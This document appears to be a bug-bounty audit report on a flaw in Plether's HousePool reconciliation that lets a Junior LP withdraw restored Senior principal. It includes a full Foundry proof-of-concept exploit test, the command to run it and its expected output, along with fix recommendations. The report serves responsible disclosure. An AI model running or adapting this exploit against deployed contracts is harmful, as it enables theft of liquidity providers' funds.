# \#98860 [SC-High] Replaying a partial recovery converts restored Senior principal into withdrawable Junior assets

**Submitted on Nov 10th 2026 at 15:59:29 UTC by @go4ko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98860
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Plether can account for the same post-deficit recovery cash twice. The first LP reconciliation correctly assigns all available recovery cash to Senior and records the owner's complete recapitalization as the Senior recovery target. A second permissionless reconciliation, with no new cash or economic loss, reserves the residual recovery buckets against that already-assigned cash. This fabricates a Senior loss, re-enters the empty-pool bootstrap, replaces the Senior high-water mark with only the residual bucket, and credits the displaced Senior value to Junior.

The PoC demonstrates the complete user-fund transfer with an independently scaled parameter set. After the first partial reconciliation, Senior owns `4,387,950` USDG of principal and retains a `5,468,624.225512` USDG recovery target. The unchanged second reconciliation reduces both Senior principal and its target to `1,080,674.225512` USDG, credits `3,307,275.774488` USDG to Junior, and completes an actual Junior `claimRedeem` transfer of `3,037,107.218110` USDG.

## Vulnerability Details

### The reconciliation planner reserves previously assigned cash again

Let:

- `S` be stored Senior principal;
- `J` be stored Junior principal;
- `H` be the Senior high-water mark;
- `R` be the pending owner recapitalization; and
- `x` be physical recovery cash that is also queued as trading revenue.

After a terminal loss, both tranche principals are zero while their share supplies and Senior's recovery entitlement survive. Governance follows the documented recovery runbook by calling `recapitalizePool(R)` and clearing degraded mode after solvency is restored.

During reconciliation, `HousePool._settleablePendingClaimantBuckets` caps the pending recapitalization and revenue buckets by current distributable assets. `HousePoolReconcilePlanLib.planReconcile` then removes the selected amount from `snapshot.distributable` before running the loss waterfall:

```solidity
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}
```

That reservation is necessary on the first pass so claimant inflows are not counted twice. The defect is that a residual bucket remains pending even after the physical cash backing it has been stored as Senior principal.

### First reconciliation: the designed recovery bootstrap

The PoC reaches pool cash and distributable assets of `x = 4,387,950` USDG with `R = 5,468,624.225512` USDG, and programmatically verifies `R / 2 < x < R`.

Because `S = J = 0`, the settleable recapitalization amount `x` enters the intended bootstrap branch. The resulting state is:

| Value | After the first reconciliation |
| --- | ---: |
| Senior principal `S` | `4,387,950.000000` USDG (`x`) |
| Senior high-water mark `H` | `5,468,624.225512` USDG (`R`) |
| Junior principal `J` | 0 |
| Pending recapitalization | `1,080,674.225512` USDG (`R - x`) |
| Pending revenue | `4,387,950.000000` USDG (`x`) |

This state is correct. Senior owns every available pool asset and remains impaired by the difference between `H` and `S`.

### Second reconciliation: unchanged cash is treated as a new loss

Nothing economic changes before the next permissionless LP settlement: no deposit, claim, position, price movement, or loss occurs. Nevertheless, the residual recapitalization plus pending revenue exceeds the same `x` of cash, so the planner reserves the entire distributable balance again.

The ordinary waterfall now compares zero unreserved distributable assets with the already-recorded `S = x` and transiently reduces Senior principal to zero.

`applyClaimantRecapitalizationIntent` mistakes that planner-created zero for a genuinely empty post-wipe pool:

```solidity
if (state.seniorSupply > 0) {
    if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
        state.waterfall.seniorPrincipal += remaining;
        state.waterfall.seniorHighWaterMark =
            recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
        remaining = 0;
    }
}
```

On this second pass, `recapitalizationTargetAssets` is only the residual `R - x`. The function therefore overwrites the existing `H = R` with `H = R - x`.

Meanwhile, `HousePool._reconcile` captured `allowRevenueContinuation` from the stored pre-plan state, where Senior principal was nonzero. Revenue application continues after the false bootstrap. Since the overwritten high-water mark now equals the re-credited Senior principal, the apparent Senior restoration gap is zero and `2x - R` is assigned to Junior.

The faulty transition is:

| State | Senior principal | Senior mark | Junior principal created |
| --- | ---: | ---: | ---: |
| After pass 1 | `x` | `R` | 0 |
| After pass 2 | `R - x` | `R - x` | `2x - R` |

Senior loses `2x - R = 3,307,275.774488` USDG of stored principal and recovery priority without a new loss. Junior receives that same accounting value and can withdraw it subject only to the ordinary tranche covenant. The PoC actually transfers `3,037,107.218110` USDG to the Junior LP.

### This is not the intended one-time post-wipe reset

Plether's recovery tests intentionally reset the old pre-wipe mark when an explicit owner recapitalization first bootstraps an empty waterfall. The first reconciliation above performs that design correctly by setting `H = R`.

The vulnerability is the later replay:

- no new recapitalization arrives;
- no Senior LP withdraws;
- pool cash is unchanged;
- Senior principal has already been restored; and
- the established recovery target falls from `R` to `R - x`.

That contradicts both documented accounting rules:

- `SECURITY.md`: “Senior impairment must be restored before junior extracts surplus.”
- `ACCOUNTING_SPEC.md`: “Losses do not reduce the Senior high-water mark.”

### Attack path

1. Senior and Junior LP shares survive a terminal loss that leaves both stored tranche principals at zero.
2. Governance performs the documented recovery actions: it recapitalizes the pool and clears degraded mode once the claim backing permits it.
3. A losing trader later contributes `x` of real pool cash, which remains queued as revenue because both stored principals are zero.
4. A Junior LP requests redemption and permissionlessly settles the next LP epoch. The first partial reconciliation assigns all cash to Senior and records the complete owner recapitalization as `H`.
5. After the ordinary refund cooldown, the Junior LP repeats the redemption and LP settlement without any intervening economic change.
6. The second reconciliation lowers `S` and `H`, credits the displaced amount to Junior, and funds the Junior redemption.
7. The Junior LP calls `claimRedeem` and receives USDG that the previous reconciliation had assigned to Senior.

The extracting party needs no privileged role. Governance's recovery actions are legitimate preconditions, not malicious actions.

### Relation to disclosed fixes

The contest rules expressly permit this category: “A finding marked fixed or acknowledged may be reported on the same root cause only when the report proves that the fix at the frozen commit is incomplete or introduced a new bug.” This is an incomplete-fix path rather than a resubmission of the earlier findings:

- **SC Audit Studio SC-L1** introduced the settleable cap and left unbacked claimant intent pending. The later pass now reserves that residual against cash already credited to principal.
- **Cecuro MED-12** addressed revenue continuation after recapitalization. Here that continuation acts after a second false bootstrap and directs restored Senior value to Junior.
- **Cecuro MED-11** concerns high-water-mark scaling during a real Senior withdrawal. No Senior withdrawal occurs here.

## Impact Details

This is direct theft of Senior LP funds, not merely theft of unclaimed yield.

After pass 1, the protocol has stored all `4,387,950` USDG of physical recovery cash as Senior principal. Pass 2 removes `3,307,275.774488` USDG from that already-established principal and its restoration priority. The same pass makes the displaced value Junior-owned, and the PoC completes an actual `claimRedeem` transfer of `3,037,107.218110` USDG to the Junior LP.

The resulting state changes are:

- Senior principal: `4,387,950.000000` → `1,080,674.225512` USDG;
- Senior high-water mark: `5,468,624.225512` → `1,080,674.225512` USDG;
- Junior principal credited: `3,307,275.774488` USDG; and
- Junior USDG actually withdrawn: `3,037,107.218110` USDG.

The transfer is permissionless once the documented recovery state exists and scales with the pool, recapitalization, and queued cash. It matches the in-scope Critical impact “Direct theft of any user funds, whether at rest or in motion, other than unclaimed yield.”

## Recommendation

1. Do not infer a genuine empty-pool bootstrap from principal that the planner only transiently reduced to zero.
2. Preserve the complete Senior recovery target across every residual recapitalization settlement; a later pass must never lower the target established by the explicit owner recapitalization.
3. Track which physical cash already backs stored claimant principal so a residual pending bucket cannot reserve it again.
4. Add an idempotence regression: with unchanged cash, claims, positions, and prices, a second reconciliation must not change `S`, `J`, or `H`.

## References

- [`HousePool._reconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1598)
- [`HousePool._settleablePendingClaimantBuckets`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834)
- [`HousePoolReconcilePlanLib.planReconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L47-L106)
- [`applyClaimantRecapitalizationIntent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111-L137)
- [`applyRevenueIntent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L158-L189)
- [`SECURITY.md` Senior-first invariant](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L386-L395)
- [`ACCOUNTING_SPEC.md` high-water-mark rule](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L329-L340)
- [Designed post-wipe recovery reset](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/TrancheRecoveryBehavior.t.sol#L24-L55)
- [SC Audit Studio pre-audit, SC-L1](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf)

## Proof of Concept

## Proof of Concept

The PoC uses the same production path as the vulnerability:

- V3 `commitOrder` and permissionless `executeOrder`;
- public asynchronous LP deposit, redemption, refund, and claim functions;
- permissionless Router `settleLpEpoch`;
- the release 40% skew limit and 40M/80% Senior configuration; and
- only the documented owner recovery calls `recapitalizePool` and `clearDegradedMode`.

Only Pyth and USDG are mocked, as allowed dependencies. The balanced stress book reaches the supported `0.01` and `2.00` price endpoints. Both stress accounts have sufficient margin, so the sequence does not depend on winning a liquidation race. After recovery, the two partial reconciliations occur with unchanged cash, claims, and economic state.

Save the following file as `packages/perps/test/perps/regression/SeniorRecoveryReplayCritical.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {console2} from "forge-std/console2.sol";

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

/// Cheatcodes and test helpers used:
/// - MockSettlementToken.mint funds EOAs and the legitimate owner recapitalization; USDG is explicitly mockable.
/// - vm.prank/startPrank act only as ordinary LPs, traders, or a permissionless keeper, never as an in-scope contract.
/// - vm.warp advances only the real 72-hour config delay, one-hour LP epochs, and one-hour redemption cooldowns.
/// - BasePerpTest._mockPythUpdateData advances one block/second and supplies a signed-price mock through the public Router.
/// - BasePerpTest._fundTrader uses the public clearinghouse deposit path.
/// - No vm.store, in-scope-contract impersonation, legacy Router entrypoint, or forged in-scope balance is used.
contract SeniorRecoveryReplayCriticalPoC is BasePerpTest {
    address internal constant JUNIOR_EXTRACTOR = address(0xB001);
    address internal constant SENIOR_VICTIM = address(0xB002);
    address internal constant ENDPOINT_LONG = address(0xB003);
    address internal constant ENDPOINT_SHORT = address(0xB004);
    address internal constant REVENUE_TRADER = address(0xB005);
    address internal constant PUBLIC_KEEPER = address(0xB006);

    uint256 internal constant FLOOR_MARK = 1_000_000; // 0.01 endpoint
    uint256 internal constant PAR_MARK = 1e8;
    // Independent 90%-scale construction: the ratios are unchanged, but every
    // pool, trader, recapitalization, and payout value uses the scaled fixture.
    uint256 internal constant JUNIOR_LIQUIDITY = 2_250_000e6;
    uint256 internal constant SENIOR_LIQUIDITY = 8_910_000e6;
    uint256 internal constant HEDGED_MARGIN = 9_000_000e6;
    uint256 internal constant BOOK_LEG = 3_600_000e18;
    uint256 internal constant BOOK_TAIL = 1_170_000e18;
    uint256 internal constant BOOK_SIZE = 8_370_000e18;
    uint256 internal constant REVENUE_POSITION = 2_205_000e18;
    uint256 internal constant REVENUE_MARGIN = 4_680_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function test_UnchangedRecoveryReplayTransfersSeniorPrincipal() public {
        // Restore BasePerpTest's permissive fixture limits to the release 40M / 80% configuration.
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000);

        uint256 attackerShares = _activateLiquidity(juniorVault, JUNIOR_EXTRACTOR, JUNIOR_LIQUIDITY, PAR_MARK);
        _activateLiquidity(seniorVault, SENIOR_VICTIM, SENIOR_LIQUIDITY, PAR_MARK);
        assertGt(attackerShares, 0);
        assertEq(pool.totalAssets(), JUNIOR_LIQUIDITY + SENIOR_LIQUIDITY + 2e6);

        _fundTrader(ENDPOINT_LONG, 9_450_000e6);
        _fundTrader(ENDPOINT_SHORT, 9_450_000e6);
        _fundTrader(REVENUE_TRADER, 4_950_000e6);

        // Alternation keeps every intermediate skew below 40% of the approximately 11.16M pool.
        _commitAndExecute(ENDPOINT_LONG, CfdTypes.Side.LONG, BOOK_LEG, HEDGED_MARGIN, false, PAR_MARK);
        _commitAndExecute(ENDPOINT_SHORT, CfdTypes.Side.SHORT, BOOK_LEG, HEDGED_MARGIN, false, PAR_MARK);
        _commitAndExecute(ENDPOINT_LONG, CfdTypes.Side.LONG, BOOK_LEG, 18_000e6, false, PAR_MARK);
        _commitAndExecute(ENDPOINT_SHORT, CfdTypes.Side.SHORT, BOOK_LEG, 18_000e6, false, PAR_MARK);
        _commitAndExecute(ENDPOINT_LONG, CfdTypes.Side.LONG, BOOK_TAIL, 18_000e6, false, PAR_MARK);
        _commitAndExecute(ENDPOINT_SHORT, CfdTypes.Side.SHORT, BOOK_TAIL, 18_000e6, false, PAR_MARK);

        // At CAP this contributes 4.41M of SHORT OI, less than 0.4 * 11.16M, and has zero max profit.
        _commitAndExecute(
            REVENUE_TRADER, CfdTypes.Side.SHORT, REVENUE_POSITION, REVENUE_MARGIN, false, CAP_PRICE
        );
        assertEq(pool.pendingTradingRevenueAssets(), 0, "revenue is not queued while stored LP principal exists");

        // Both endpoint accounts have 9M margin, so neither transition relies on a liquidation race.
        _commitAndExecute(ENDPOINT_LONG, CfdTypes.Side.LONG, BOOK_SIZE, 0, true, FLOOR_MARK);
        assertTrue(engine.degradedMode(), "remaining endpoint liability exceeds cash");

        _commitAndExecute(ENDPOINT_SHORT, CfdTypes.Side.SHORT, BOOK_SIZE, 0, true, CAP_PRICE);
        uint256 traderClaim = engine.traderClaimBalanceAssets(ENDPOINT_SHORT);
        uint256 cashBeforeRecap = pool.totalAssets();
        assertGt(traderClaim, cashBeforeRecap, "second endpoint winner must become a claim");
        assertEq(engine.totalTraderClaimBalanceAssets(), traderClaim);

        uint256 recapitalization = traderClaim - cashBeforeRecap;
        settlementToken.mint(address(this), recapitalization);
        settlementToken.approve(address(engine), recapitalization);
        engine.recapitalizePool(recapitalization);
        assertEq(pool.totalAssets(), traderClaim, "owner restores exact aggregate claim backing");

        // The only remaining position entered at CAP and has L=0, so this documented recovery action is legal.
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode());

        // A matured zero-quote request makes the D=0 reconcile persist instead of reverting as no progress.
        (uint256 wipeRequestId,) = _queueJuniorExit();
        _advanceToEpoch(wipeRequestId);
        _settleEpoch(CAP_PRICE);
        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        assertGt(pool.seniorHighWaterMark(), 0, "Senior recovery entitlement survives the real loss");
        assertEq(pool.pendingRecapitalizationAssets(), recapitalization);
        assertEq(pool.pendingTradingRevenueAssets(), 0);
        _recoverRefundedShares(wipeRequestId);

        // Claim payment lowers P and C equally, so terminal distributable value remains zero.
        vm.prank(ENDPOINT_SHORT);
        engine.settleTraderClaim(ENDPOINT_SHORT);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0);
        assertEq(pool.totalAssets(), 0);

        // The donor's real loss is now the pool's only cash and is queued because stored S and J are zero.
        _commitAndExecute(REVENUE_TRADER, CfdTypes.Side.SHORT, REVENUE_POSITION, 0, true, FLOOR_MARK);
        uint256 revenueCash = pool.totalAssets();
        uint256 queuedRevenue = pool.pendingTradingRevenueAssets();
        assertEq(queuedRevenue, revenueCash, "all post-wipe pool cash is queued donor revenue");
        assertGt(recapitalization, revenueCash, "first pass must apply only part of recapitalization");
        assertGt(2 * revenueCash, recapitalization, "second pass must reach the revenue bucket");
        assertGt(9 * revenueCash, 5 * recapitalization, "release covenant must leave positive Junior capacity");

        uint256 residualRecap = recapitalization - revenueCash;
        uint256 misroutedJunior = 2 * revenueCash - recapitalization;

        // Pass one: D=x is reserved for recapitalization, creating S=x and H=R; Junior still quotes zero.
        (uint256 firstPartialId,) = _queueJuniorExit();
        _advanceToEpoch(firstPartialId);
        _settleEpoch(FLOOR_MARK);
        assertEq(pool.totalAssets(), revenueCash);
        assertEq(pool.seniorPrincipal(), revenueCash);
        assertEq(pool.seniorHighWaterMark(), recapitalization);
        assertEq(pool.juniorPrincipal(), 0);
        assertEq(pool.pendingRecapitalizationAssets(), residualRecap);
        assertEq(pool.pendingTradingRevenueAssets(), revenueCash);
        _recoverRefundedShares(firstPartialId);

        // No cash, claim, position, or economic loss changes between the two partial passes.
        assertEq(pool.totalAssets(), revenueCash);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0);

        // Pass two: planReconcile temporarily wipes S. The faulty bootstrap branch writes H=R-x,
        // then allowRevenueContinuation routes 2x-R to Junior and funds this request.
        (uint256 exploitRequestId,) = _queueJuniorExit();
        _advanceToEpoch(exploitRequestId);
        _settleEpoch(FLOOR_MARK);

        uint256 fundedShares = juniorVault.claimableRedeemRequest(exploitRequestId, JUNIOR_EXTRACTOR);
        uint256 fundedAssets = juniorVault.claimableRedeemAssets(exploitRequestId, JUNIOR_EXTRACTOR);
        assertGt(fundedShares, 0);
        assertGt(fundedAssets, 1_000_000e6, "material Senior recovery is now claimable by Junior");

        assertEq(pool.seniorPrincipal(), residualRecap);
        assertEq(pool.seniorHighWaterMark(), residualRecap, "fault deletes the existing H=R entitlement");
        assertEq(recapitalization - pool.seniorHighWaterMark(), revenueCash);
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(pool.pendingTradingRevenueAssets(), residualRecap);
        assertEq(pool.juniorPrincipal(), misroutedJunior - fundedAssets);

        uint256 attackerBalanceBefore = settlementToken.balanceOf(JUNIOR_EXTRACTOR);
        vm.prank(JUNIOR_EXTRACTOR);
        uint256 paid = juniorVault.claimRedeem(
            exploitRequestId, fundedShares, JUNIOR_EXTRACTOR, JUNIOR_EXTRACTOR
        );
        assertEq(paid, fundedAssets);
        assertEq(settlementToken.balanceOf(JUNIOR_EXTRACTOR) - attackerBalanceBefore, paid);
        console2.log("owner recovery target  :", recapitalization);
        console2.log("cash reused by replay  :", revenueCash);
        console2.log("Senior mark after replay:", pool.seniorHighWaterMark());
        console2.log("USDG withdrawn by Junior:", paid);
    }

    function _activateLiquidity(
        TrancheVault vault,
        address lp,
        uint256 assets,
        uint256 markPrice
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();

        uint256 activationTime = vault.depositEpochStart(requestId);
        if (block.timestamp < activationTime) {
            vm.warp(activationTime); // Ordinary asynchronous LP epoch delay.
        }
        _settleEpoch(markPrice);

        uint256 claimableAssets = vault.claimableDepositRequest(requestId, lp);
        assertEq(claimableAssets, assets);
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, claimableAssets, lp, lp);
    }

    function _commitAndExecute(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 executionPrice
    ) internal returns (uint64 orderId) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = bytes32(uint256(router.nextCommitId()) + 0x1000);
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = executionPrice;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });

        vm.prank(account);
        orderId = router.commitOrder(request);
        bytes[] memory updateData = _mockPythUpdateData(executionPrice);
        vm.prank(PUBLIC_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, updateData);
        assertEq(result.orderId, orderId);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _settleEpoch(
        uint256 price
    ) internal {
        bytes[] memory updateData = _mockPythUpdateData(price);
        vm.prank(PUBLIC_KEEPER);
        router.settleLpEpoch(updateData);
    }

    function _queueJuniorExit() internal returns (uint256 requestId, uint256 shares) {
        _advancePastJuniorCooldown();
        shares = juniorVault.balanceOf(JUNIOR_EXTRACTOR);
        assertGt(shares, 0);
        vm.prank(JUNIOR_EXTRACTOR);
        requestId = juniorVault.requestRedeem(shares, JUNIOR_EXTRACTOR, JUNIOR_EXTRACTOR);
    }

    function _recoverRefundedShares(
        uint256 requestId
    ) internal returns (uint256 shares) {
        shares = juniorVault.refundableRedeemRequest(requestId, JUNIOR_EXTRACTOR);
        assertGt(shares, 0, "zero-quote epoch must return the attacker's shares");
        vm.prank(JUNIOR_EXTRACTOR);
        uint256 returnedShares =
            juniorVault.claimRedeemRefund(requestId, JUNIOR_EXTRACTOR, JUNIOR_EXTRACTOR);
        assertEq(returnedShares, shares);
    }

    function _advancePastJuniorCooldown() internal {
        uint256 ready = juniorVault.lastDepositTime(JUNIOR_EXTRACTOR) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < ready) {
            vm.warp(ready); // Ordinary one-hour cooldown after deposit activation or share refund.
        }
    }

    function _advanceToEpoch(
        uint256 requestId
    ) internal {
        uint256 maturity = pool.lpEpochStart(requestId);
        if (block.timestamp < maturity) {
            vm.warp(maturity); // Ordinary one-hour epoch maturation, including the five-minute request cutoff rule.
        }
    }
}
```

Run:

```sh
forge test --root packages/perps \
  --match-path test/perps/regression/SeniorRecoveryReplayCritical.t.sol -vv
```

Expected result:

```text
Ran 1 test for test/perps/regression/SeniorRecoveryReplayCritical.t.sol:SeniorRecoveryReplayCriticalPoC
[PASS] test_UnchangedRecoveryReplayTransfersSeniorPrincipal()
Logs:
  owner recovery target  : 5468624225512
  cash reused by replay  : 4387950000000
  Senior mark after replay: 1080674225512
  USDG withdrawn by Junior: 3037107218110

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

All logged values are USDG atoms with six decimals. The test proves the full transfer, including the Junior LP's final USDG balance increase.
